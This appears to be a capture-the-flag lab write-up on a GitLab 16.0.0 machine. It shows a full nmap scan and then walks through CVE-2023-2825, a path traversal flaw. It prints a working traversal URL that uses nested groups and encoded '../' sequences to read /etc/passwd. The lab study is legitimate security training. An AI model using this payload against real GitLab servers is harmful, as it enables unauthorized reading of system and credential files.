![image](https://github.com/user-attachments/assets/c6d1211d-8119-43f3-b7b3-2aadeb255fd8)![image](https://github.com/user-attachments/assets/61a2193a-1fb9-4e90-bde8-1712eb485257)# Writeup

# Enumeration
---
### Nmap
#

TCP scan of all ports, including default scripts.

```bash
# Command
sudo nmap -v -sS -sV -sC -T4 -p- -oA getbash-tcp-fullportscan 10.129.229.69

# Output
# Nmap 7.94SVN scan initiated Mon Dec 16 11:33:36 2024 as: nmap -v -sS -sV -sC -T4 -p- -oA getbash-tcp-fullportscan 10.129.229.69
Nmap scan report for 10.129.229.69
Host is up (0.050s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f3:e8:cf:2e:39:5f:c9:c8:f1:e8:97:a8:04:6a:28:c2 (RSA)
|   256 9b:8a:64:29:f0:b8:c3:c0:4c:55:f0:78:27:ce:c5:86 (ECDSA)
|_  256 c8:2b:18:14:bd:77:2b:0c:68:f6:c3:cb:92:46:34:66 (ED25519)
80/tcp   open  http    nginx
|_http-favicon: Unknown favicon MD5: 66F9A1C3F2CFD0DF1B570990E86D3095
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 57 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile 
|_/-/ide/ /-/experiment /*/new
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.229.69/users/sign_in
8060/tcp open  http    nginx 1.20.2
|_http-title: 404 Not Found
|_http-server-header: nginx/1.20.2
| http-methods: 
|_  Supported Methods: GET HEAD POST
9094/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 16 11:34:12 2024 -- 1 IP address (1 host up) scanned in 36.71 seconds
```

# HTTP (Port 80)

Port 80 on this box is hosting GitLab, I create an account so I can access more of the application before browsing the site. 

After registering an account, the help page displays the current version installed on this machine: v16.0.0.

![image](https://github.com/user-attachments/assets/a7ac5104-a772-46bb-9880-4d69b2bd56e8)

This version has a prominant vulnerability: **[CVE-2023-2825](https://www.getastra.com/blog/vulnerability/cve-2023-2825/#:~:text=About%20CVE%2D2023%2D2825,and%20Enterprise%20Edition%20version%2016.0.)**

This vulnerability is a Path Traversal vulnerability, it requirews you to create 10 nested group and then create a propject in the final group. In this group you can raise an issue with an attachment, the response to this request will give you the file path for the upload, this is where the path traversal vulnerability lies. 

The followin 2 guides were used to exploit this vulnerability:
[Juniper Guide](https://blogs.juniper.net/en-us/threat-research/cve-2023-2825-gitlab-arbitrary-path-traversal-vulnerability)
[Occamsec Guide](https://occamsec.com/exploit-for-cve-2023-2825/)

A minimum of 10 groups are needed, this is the number needed to reach the base directory, this is because on a standard Gitlab install, file attachments are uploaded to `/var/opt/gitlab/gitlab-rails/uploads/@hashed/<a>/<b>/<secret>/<secret>/<file>`. I'm assuming there is a rule in the code allowing you to traverse the number of groups back. The 10 groups and project can be seen below:

![image](https://github.com/user-attachments/assets/b3b04139-ff2d-4887-9935-b53aace61a44)

From here I can upload anydocument to an issue on that project and see in the response the file path.

```text
"note":"[testDoc.txt](/uploads/b5b4ddeeccb3365ce8ca8b9fa5b31900/testDoc.txt)
```

I can append this to the URL to view the file, the full URL in this example would be:

```text
http://<ip>/group-1/group-2/group-3/group-4/group-5/group-6/group-7/group-8/group-9/group-10/group-11/project-2/uploads/b5b4ddeeccb3365ce8ca8b9fa5b31900/testDoc.txt
```

It is this URL I can exploit, by using path traversal to access files instead of test Doc.txt. The rule in this exploit is to traverse the number of groups + 1, in this case that will be 11. Forward slashes must also be URL encoded. The full attack URL ends up:

```text
http://<ip>/group-1/group-2/group-3/group-4/group-5/group-6/group-7/group-8/group-9/group-10/group-11/project-2/uploads/b5b4ddeeccb3365ce8ca8b9fa5b31900/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

This traverses to the base directory and accesses /etc/passwd:

![image](https://github.com/user-attachments/assets/02fad883-6a92-4b18-958f-3d16d518b900)


